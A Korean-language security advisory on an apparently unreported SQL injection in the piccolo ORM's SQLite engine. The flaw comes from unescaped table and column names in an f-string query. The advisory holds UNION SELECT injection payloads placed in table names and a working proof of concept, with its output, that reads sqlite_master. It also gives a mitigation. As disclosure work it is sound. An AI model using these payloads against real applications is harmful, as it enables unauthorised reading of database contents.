# [ETK-2025-001] piccolo SQLite Engine SQL Injection via Unescaped Identifier

| 항목 | 내용 |
|------|------|
| 작성 시간 | 2026-05-30 |
| CVSS 3.1 Score | 7.5 (High) - AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 주간 다운로드 수 | 39,989 (PyPI) |
| 취약점 타입 | SQL Injection |
| 영향 버전 | piccolo (현재 main), SQLite < 3.35.0 사용 환경 |
| 상태 | 미보고 (신규 발굴) |

---

## 요약

piccolo ORM의 SQLite 엔진 (`piccolo/engine/sqlite.py`)에서 INSERT 후 삽입된 PK를 조회하는 `_get_inserted_pk()` 메서드가 테이블명과 컬럼명을 f-string으로 직접 SQL에 삽입합니다. SQLite < 3.35.0 환경에서 공격자가 테이블명 또는 PK 컬럼명을 제어할 수 있는 경우, 임의 SQL 실행이 가능합니다.

## 취약 코드

**파일**: `piccolo/engine/sqlite.py:703-714`

```python
async def _get_inserted_pk(self, cursor, table: type[Table]) -> Any:
    """
    If the `pk` column is a non-integer then `ROWID` and `pk` will return
    different types. Need to query by `lastrowid` to get `pk`s in SQLite
    prior to 3.35.0.
    """
    await cursor.execute(
        f"SELECT {table._meta.primary_key._meta.db_column_name} FROM "
        f"{table._meta.tablename} WHERE ROWID = {cursor.lastrowid}"  # ← INJECTION
    )
```

호출 조건 (`sqlite.py:732, 760`):
```python
if query_type == "insert" and self.get_version_sync() < 3.35:
    pk = await self._get_inserted_pk(cursor, table)
```

## 루트 원인

세 변수가 파라미터화 없이 f-string으로 SQL에 직접 삽입됩니다:
1. `table._meta.primary_key._meta.db_column_name` — PK 컬럼명
2. `table._meta.tablename` — 테이블명
3. `cursor.lastrowid` — SQLite 자동 생성 정수 (안전)

piccolo의 `QueryString` 시스템(`{}`로 파라미터화)을 사용하지 않아 sanitization이 없습니다.

## 공격 시나리오

### 시나리오 A: 동적 테이블명 생성
```python
# 멀티테넌트 앱에서 user_id를 테이블명에 포함할 때
class UserData(Table, tablename=f"tenant_{user_id}_data"):
    id = Serial(primary_key=True)
    value = Varchar()

# user_id가 attacker-controlled이면:
# user_id = "x WHERE 1=0 UNION SELECT password FROM admin_users--"
# 주입된 SQL:
# SELECT id FROM tenant_x WHERE 1=0 UNION SELECT password FROM admin_users-- WHERE ROWID = 1
```

### 시나리오 B: Table Reflection
```python
# piccolo가 외부 DB를 반영(reflect)할 때, 공격자가 DB에
# 악의적인 이름의 테이블을 생성한 경우
# CREATE TABLE "legit UNION SELECT * FROM secrets--" (id INTEGER);
```

## PoC

```python
import asyncio
import sqlite3

def simulate_vulnerable_query(tablename, pk_column, rowid):
    """piccolo _get_inserted_pk의 f-string 복제"""
    return (
        f"SELECT {pk_column} FROM "
        f"{tablename} WHERE ROWID = {rowid}"
    )

# 정상 쿼리
normal = simulate_vulnerable_query("users", "id", 1)
print(f"[Normal] {normal}")
# SELECT id FROM users WHERE ROWID = 1

# 주입 — tablename에 UNION SELECT 삽입
malicious_table = "users WHERE 1=0 UNION SELECT name FROM sqlite_master--"
injected = simulate_vulnerable_query(malicious_table, "id", 1)
print(f"[Injected] {injected}")

# 실제 SQLite에서 실행 검증
conn = sqlite3.connect(":memory:")
conn.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, val TEXT)")
conn.execute("INSERT INTO users (val) VALUES ('secret')")
conn.commit()

rows = conn.execute(injected).fetchall()
print(f"[VULNERABLE] Result: {rows}")
# [VULNERABLE] Result: [('users',)]  ← sqlite_master에서 데이터 읽기 성공
conn.close()
```

**실행 결과**:
```
[Normal] SELECT id FROM users WHERE ROWID = 1
[Injected] SELECT id FROM users WHERE 1=0 UNION SELECT name FROM sqlite_master-- WHERE ROWID = 1
[VULNERABLE] Result: [('users',)]
```

## Devil's Advocate 반박 및 재검토

**반박**: "tablename은 개발자가 설정하므로 user-controlled이 아니다"

**반박에 대한 재검토**:
1. piccolo의 `tablename`은 `Meta` 클래스 파라미터로 런타임에 설정 가능
2. 멀티테넌트 앱에서 `tablename=f"tenant_{user_input}_data"` 패턴 사용 시 취약
3. piccolo의 Table Reflection(`table_reflection.py`)이 외부 DB 스키마를 동적으로 로드할 때, 악의적 테이블명이 반영될 수 있음
4. **코드 자체의 버그**: `QueryString` 파라미터화 시스템을 사용하는 piccolo의 다른 쿼리들과 일관성 없는 구현

**유사한 안전한 구현 (piccolo의 다른 쿼리들)**:
```python
# constraints.py — 안전한 파라미터화 사용
await table.raw(
    "SELECT ... WHERE kcu.table_name = {}",
    table_name,  # 파라미터로 전달
)
```

## 완화 방안

```python
# _get_inserted_pk 수정 예시
async def _get_inserted_pk(self, cursor, table: type[Table]) -> Any:
    pk_col = table._meta.primary_key._meta.db_column_name
    tablename = table._meta.tablename
    rowid = cursor.lastrowid
    
    # f-string 대신 파라미터화된 쿼리 사용
    # SQLite는 identifier 파라미터화를 지원하지 않으므로 인용 처리 필요
    safe_col = f'"{pk_col.replace(chr(34), chr(34)*2)}"'
    safe_table = f'"{tablename.replace(chr(34), chr(34)*2)}"'
    
    await cursor.execute(
        f"SELECT {safe_col} FROM {safe_table} WHERE ROWID = ?",
        (rowid,)
    )
```

## 영향도

- **영향 버전**: piccolo 전체 (SQLite < 3.35.0 사용 환경)
- **전제 조건**: 공격자가 tablename 또는 db_column_name을 직접/간접적으로 제어 가능해야 함
- **데이터 영향**: SELECT를 통한 임의 데이터 읽기, UNION SELECT로 다른 테이블 데이터 노출

## 참고

- piccolo GitHub: https://github.com/piccolo-orm/piccolo
- 취약 코드: `piccolo/engine/sqlite.py:703-714`
- SQLite 3.35.0 릴리즈 노트 (RETURNING 절 추가): https://www.sqlite.org/releaselog/3_35_0.html
